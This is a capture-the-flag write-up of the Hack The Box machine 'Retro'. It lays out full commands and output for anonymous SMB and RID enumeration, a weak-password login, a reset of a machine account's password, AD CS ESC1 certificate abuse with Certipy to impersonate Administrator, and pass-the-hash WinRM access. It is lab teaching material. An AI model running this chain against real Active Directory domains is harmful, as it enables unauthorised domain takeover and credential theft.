---
title: "HTB Retro Writeup: From Anonymous SMB to AD CS ESC1"
title_post: "HTB Retro Writeup: From Anonymous SMB to AD CS ESC1"
date: 2026-08-13 00:00:00 +0500

categories:
  - HTB
  - Windows
  - Easy

tags:
  - htb
  - windows
  - easy
  - active-directory
  - smb
  - ad-cs
  - esc1
  - certificate-services
  - privilege-escalation
  - evil-winrm

description: HTB Retro writeup covering anonymous SMB enumeration, weak trainee credentials, a pre-created computer account, AD CS ESC1 certificate abuse, Administrator impersonation, and NT hash recovery.

image:
  path: /assets/img/writeups/retro/banner.png
  alt: HTB Retro Writeup
---

## 1. Machine Information

| Machine | Retro |
|---------|-------|
| Platform | [Hack The Box](https://www.hackthebox.com/) |
| OS | Windows Server 2022 |
| Difficulty | — |
| Domain | `retro.vl` |
| Initial Access | Anonymous SMB + weak `trainee` credentials |
| Privilege Escalation | AD CS ESC1 |
| Final Access | Administrator via NT hash / WinRM |

## 2. Attack Path

```text
Anonymous SMB
      ↓
Weak trainee Credentials
      ↓
BANKING$ Computer Account
      ↓
Reset BANKING$ Password
      ↓
AD CS Enumeration
      ↓
ESC1 Misconfiguration 
      ↓
Administrator Certificate
      ↓
Administrator NT Hash
      ↓
WinRM → Administrator
```

## 3. Overview

**Retro** is a Windows Active Directory machine where the initial foothold comes from a combination of anonymous SMB access, information disclosure, and weak credentials.

The interesting part of the machine is the transition from a low-privileged account to a machine account and then into Active Directory Certificate Services.

After gaining access to the `Notes` share, an administrative note points toward a pre-created computer account named `BANKING$`. Although the account initially cannot be used for normal authentication, its password can be changed through RPC-SAMR.

With valid credentials for the machine account, AD CS enumeration reveals the `RetroClients` certificate template. The template is vulnerable to **ESC1** because it allows the enrollee to supply the subject while supporting Client Authentication. Since `BANKING$` is a member of `Domain Computers`, it can enroll for the template.

The certificate can then be requested for the Domain Administrator account. Certipy authenticates with the resulting certificate and retrieves the Administrator NT hash, which can finally be used for remote access through WinRM.

---

## 4. Reconnaissance & Enumeration

### 4.1 Service & Port Scanning

The first step was a standard service and version scan:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/retro]
└─$ nmap -sC -sV 10.129.234.44 -v

Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-08 18:26 +0500

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

The scan immediately established that this was an Active Directory Domain Controller.

Some particularly interesting services were:

- `53` — DNS
- `88` — Kerberos
- `389` — LDAP
- `445` — SMB
- `3389` — RDP
- `5985` — WinRM

The LDAP output also identified the domain as `retro.vl`, while RDP enumeration identified the hostname as `DC`.

> **💭 My Thinking**
>
> The combination of Kerberos, LDAP, SMB, and WinRM strongly suggested that I was dealing with a Domain Controller. I wanted to start with SMB because it is often one of the best sources of information before attempting more complex Active Directory enumeration.
{: .prompt-tip }

---

### 4.2 Anonymous SMB Enumeration

I first checked whether SMB allowed anonymous access:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/retro]
└─$ smbclient -L //10.129.234.44/ -N

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
Notes           Disk
SYSVOL          Disk      Logon server share
Trainees        Disk
```

Anonymous access was allowed, and two unusual shares immediately stood out:

- `Notes`
- `Trainees`

I started with `Notes`.

### 4.3 Information Disclosure

Inside the share, I found `Important.txt`:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/retro]
└─$ cat Important.txt

Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```

> **💭 My Thinking**
>
> This was a small file, but the wording was interesting. The administrators explicitly mentioned that trainees had trouble remembering passwords and that they had been bundled into one account.
>
> That sounded like a hint toward a shared or predictable credential. I kept this clue in mind while enumerating domain users.
{: .prompt-tip }

---

### 4.4 RID Enumeration

Since anonymous SMB authentication was possible, I used RID brute forcing to enumerate domain accounts:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/retro]
└─$ netexec smb dc.retro.vl -u guest -p '' --rid-brute

SMB  10.129.234.44  445  DC  [*] Windows Server 2022 Build 20348 x64
SMB  10.129.234.44  445  DC  [*] name:DC
SMB  10.129.234.44  445  DC  [*] domain:retro.vl
SMB  10.129.234.44  445  DC  [*] signing:True
SMB  10.129.234.44  445  DC  [*] SMBv1:None
SMB  10.129.234.44  445  DC  [*] Null Auth:True

SMB  10.129.234.44  445  DC  [+] retro.vl\guest:
SMB  10.129.234.44  445  DC  500: RETRO\Administrator (SidTypeUser)
SMB  10.129.234.44  445  DC  501: RETRO\Guest (SidTypeUser)
SMB  10.129.234.44  445  DC  502: RETRO\krbtgt (SidTypeUser)
SMB  10.129.234.44  445  DC  512: RETRO\Domain Admins (SidTypeGroup)
SMB  10.129.234.44  445  DC  513: RETRO\Domain Users (SidTypeGroup)
SMB  10.129.234.44  445  DC  1104: RETRO\trainee (SidTypeUser)
SMB  10.129.234.44  445  DC  1106: RETRO\BANKING$ (SidTypeUser)
SMB  10.129.234.44  445  DC  1107: RETRO\jburley (SidTypeUser)
SMB  10.129.234.44  445  DC  1108: RETRO\HelpDesk (SidTypeGroup)
SMB  10.129.234.44  445  DC  1109: RETRO\tblack (SidTypeUser)
```

The account list revealed `trainee` and, more importantly later, `BANKING$`.

---

## 5. Initial Access

### 5.1 Authenticating as Trainee

Based on the earlier `Important.txt` clue, I tested the obvious credential:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/retro]
└─$ netexec smb dc.retro.vl -u trainee -p trainee

SMB  10.129.234.44  445  DC  [+] retro.vl\trainee:trainee
```

The credentials worked.

> **💭 My Thinking**
>
> The `trainee:trainee` login was exactly the kind of weak credential the note seemed to be hinting at. This is a good reminder not to ignore seemingly casual information-disclosure files. Sometimes the clue is more valuable than another automated scan.
{: .prompt-tip }

### 5.2 Internal Share Enumeration & User Flag

With the `trainee` credentials, I connected to the `Notes` share:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/retro]
└─$ smbclient //dc.retro.vl/Notes -U 'trainee%trainee'

Try "help" to get a list of possible commands.
smb: \> ls

  .                                   D        0  Wed Apr  9 08:12:49 2025
  ..                                DHS        0  Wed Jun 11 19:17:10 2025
  ToDo.txt                            A      248  Mon Jul 24 03:05:56 2023
  user.txt                            A       32  Wed Apr  9 08:13:01 2025
```

I downloaded both files:

```text
smb: \> get user.txt
smb: \> get ToDo.txt
```

The user flag was:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/retro]
└─$ cat user.txt

<REDACTED>
```

The more interesting file was `ToDo.txt`:

```text
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
```

The phrase **"pre created computer account"** immediately caught my attention.

---

## 6. Lateral Movement & Account Pivoting

### 6.1 Investigating the BANKING$ Computer Account
The RID enumeration had already revealed:

```text
RETRO\BANKING$
```

The `$` suffix strongly indicated a computer account.

I first tested whether the account could authenticate with an arbitrary password:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/retro]
└─$ netexec smb dc.retro.vl -u 'BANKING$' -p anything

SMB  10.129.234.44  445  DC  [-] retro.vl\BANKING$:anything STATUS_LOGON_FAILURE
```

I then tried the obvious password suggested by the account name:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/retro]
└─$ netexec smb dc.retro.vl -u 'BANKING$' -p banking

SMB  10.129.234.44  445  DC  [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

The second response was interesting:

```text
STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

The account existed, but normal workstation-trust authentication was not available.

> **💭 My Thinking**
>
> I did not treat the error as a dead end. In fact, it confirmed that the account was recognized by the domain. The `ToDo.txt` note had specifically told me that this was a pre-created computer account, so I started thinking about whether I could modify or reset its password instead of trying to guess it.
{: .prompt-tip }

---

### 6.2 Resetting the BANKING$ Machine Password

I used Impacket's `changepasswd` against the SAMR RPC interface:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/retro]
└─$ impacket-changepasswd -newpass "NewPassword123" \
"retro.vl/BANKING$:banking@dc.retro.vl" \
-protocol rpc-samr

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Changing the password of retro.vl\BANKING$
[*] Connecting to DCE/RPC as retro.vl\BANKING$
[*] Password was changed successfully.
```

The password was successfully changed.

At this point I had valid credentials for the `BANKING$` account:

```text
Username: BANKING$
Password: NewPassword123
Domain:   retro.vl
```

> **💭 My Thinking**
>
> This was the point where the machine shifted from ordinary SMB enumeration into Active Directory abuse. I now had a machine account that I could authenticate with, so the next question was: **what can this account enroll for or access inside the domain?**
>
> Since the target was an AD environment and the Nmap scan had already exposed LDAP, Kerberos, and certificate-related information, AD CS was worth investigating.
{: .prompt-tip }

---

## 7. Privilege Escalation (AD CS ESC1)
### 7.1 Active Directory Certificate Services Enumeration

I used Certipy to enumerate vulnerable certificate templates:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/retro]
└─$ certipy-ad find -u 'BANKING$@retro.vl' -p NewPassword123 -vulnerable -stdout

Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates

[*] Finding certificate authorities
[*] Found 1 certificate authority

[*] Found 12 enabled certificate templates

[*] Retrieving CA configuration for 'retro-DC-CA' via RRP
[*] Successfully retrieved CA configuration for 'retro-DC-CA'
```

The important certificate template was:

```text
Certificate Templates
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
```

Most importantly, the enrollment permissions included:

```text
Enrollment Rights:
    RETRO.VL\Domain Admins
    RETRO.VL\Domain Computers
    RETRO.VL\Enterprise Admins

[+] User Enrollable Principals:
    RETRO.VL\Domain Computers

[!] Vulnerabilities
    ESC1: Enrollee supplies subject and template allows client authentication.
```

This confirmed an **ESC1 vulnerability**.

#### What is ESC1?

An **ESC1** misconfiguration occurs when a certificate template allows enrollees to specify a custom Subject Alternative Name (SAN) while permitting Client Authentication. This enables low-privileged accounts to request certificates on behalf of high-privileged users like `Administrator`. You can read a detailed breakdown of the attack mechanics in [Crowe's detailed article on AD CS exploitation](https://www.crowe.com/insights/crowe-cyber-watch/exploiting-ad-cs-a-quick-look-at-esc1-esc8).

#### The Exploitation Path

With control of the BANKING$ machine account, the misconfigured template created a direct path to full domain compromise.

> **⚡ The Turning Point**
>
> The `RetroClients` template was the key to the entire machine. `BANKING$` belonged to `Domain Computers`, and that group had enrollment rights on a template that allowed the enrollee to specify the certificate subject while also supporting Client Authentication.
>
> In practical terms, this meant I could request a certificate for an identity other than `BANKING$`.
{: .prompt-info }

---

### 7.2 Target Identification (Administrator SID)

To construct the certificate request for the Domain Administrator, I enumerated the domain SID:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/retro]
└─$ impacket-lookupsid retro.vl/BANKING$:NewPassword123@dc.retro.vl

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Brute forcing SIDs at dc.retro.vl
[*] StringBinding ncacn_np:dc.retro.vl[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172

500: RETRO\Administrator
501: RETRO\Guest
502: RETRO\krbtgt
512: RETRO\Domain Admins
513: RETRO\Domain Users
...
1106: RETRO\BANKING$
```

The Administrator account uses RID `500`, giving the full SID:

```text
S-1-5-21-2983547755-698260136-4283918172-500
```

> **💭 My Thinking**
>
> The ESC1 finding gave me the mechanism, but I still needed to tell the CA which identity I wanted the certificate to represent. Since RID `500` mapped to `Administrator`, I could construct a certificate request using both the Administrator UPN and SID.
{: .prompt-tip }

---

### 7.3 Requesting the Impersonated Certificate

I requested a certificate using the vulnerable `RetroClients` template:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/retro]
└─$ certipy-ad req \
-u 'BANKING$@retro.vl' \
-p NewPassword123 \
-ca retro-DC-CA \
-template RetroClients \
-upn administrator@retro.vl \
-sid S-1-5-21-2983547755-698260136-4283918172-500 \
-key-size 4096

Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

The resulting certificate and private key were saved as:

```text
administrator.pfx
```

---

### 7.4 PKINIT Authentication & NT Hash Recovery

I then used the certificate to authenticate:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/retro]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.234.44

Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@retro.vl'
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl':
aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```

The NT hash recovered for Administrator was:

```text
252fac7066d93dd009d4fd2cd0368389
```

At this point, I had effectively obtained Administrator-level authentication without ever knowing the plaintext Administrator password.

> **⚡ Why This Worked**
>
> The vulnerable certificate template allowed me to request a Client Authentication certificate while supplying the identity information for Administrator. The Domain Controller accepted the certificate during PKINIT, and Certipy was then able to retrieve the Administrator NT hash.
{: .prompt-info }

---

### 7.5 Administrator Access with Evil-WinRM

With the Administrator NT hash, I connected to the Domain Controller through WinRM:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines/retro]
└─$ evil-winrm-py -i dc.retro.vl \
-u administrator \
-H 252fac7066d93dd009d4fd2cd0368389

[*] Connecting to 'dc.retro.vl:5985' as 'administrator'

evil-winrm-py PS C:\Users\Administrator\Documents>
```

I moved to the Administrator desktop and retrieved the root flag:

```powershell
evil-winrm-py PS C:\Users\Administrator\Documents> cd ..\Desktop
evil-winrm-py PS C:\Users\Administrator\Desktop> cat root.txt

<REDACTED>
```

The machine was fully compromised.

---

## 8. Conclusion

Retro was a great example of how several small configuration weaknesses can combine into a complete Active Directory compromise.

The attack chain was:

```text
Anonymous SMB Enumeration
        ↓
Notes Share Discovery
        ↓
Important.txt Information Disclosure
        ↓
RID Enumeration
        ↓
Weak trainee:trainee Credentials
        ↓
Notes Share Access
        ↓
Discovery of BANKING$ Computer Account
        ↓
Reset BANKING$ Password via RPC-SAMR
        ↓
AD CS Enumeration with Certipy
        ↓
ESC1 — Vulnerable RetroClients Template
        ↓
Request Certificate as Administrator
        ↓
Certificate Authentication
        ↓
Recover Administrator NT Hash
        ↓
Evil-WinRM
        ↓
Administrator Access
```

What made the machine particularly interesting was that there was no single obvious vulnerability at the beginning. The compromise developed by following small pieces of information:

1. Anonymous SMB access exposed useful shares.
2. `Important.txt` hinted at weak trainee credentials.
3. RID enumeration revealed the `BANKING$` computer account.
4. `ToDo.txt` specifically pointed toward that account.
5. The failed trust-account authentication suggested that the account still existed but required a different approach.
6. Resetting its password provided valid machine-account credentials.
7. AD CS enumeration exposed the vulnerable `RetroClients` template.
8. ESC1 allowed the machine account to request a certificate representing Administrator.
9. Certificate authentication provided the Administrator NT hash.
10. The hash resulted in full remote administrative access.

> **🧠 Final Takeaway**
>
> The biggest lesson I took from Retro was to keep following the clues instead of immediately looking for a one-shot exploit. The SMB shares, text files, account naming, authentication error, and certificate template each looked relatively small on their own. Together, they formed the complete attack path.
>
> For me, the most valuable part was seeing how a seemingly low-privileged **computer account** could eventually become a path to **Domain Administrator** through AD CS.
{: .prompt-info }

## 9. Key Lessons

- Always enumerate anonymous SMB access when available.
- Read files found on shares instead of treating them as noise.
- Use RID enumeration to discover domain accounts.
- Pay attention to `$`-suffixed computer accounts.
- Authentication errors can reveal useful information about account state.
- Machine accounts can have meaningful AD permissions.
- Enumerate AD CS when Certificate Services are present.
- Understand ESC1 and the security implications of enrollee-supplied subjects.
- Certificate-based authentication can lead to credential material such as NT hashes.
- Build an attack chain from small findings rather than relying on a single vulnerability.
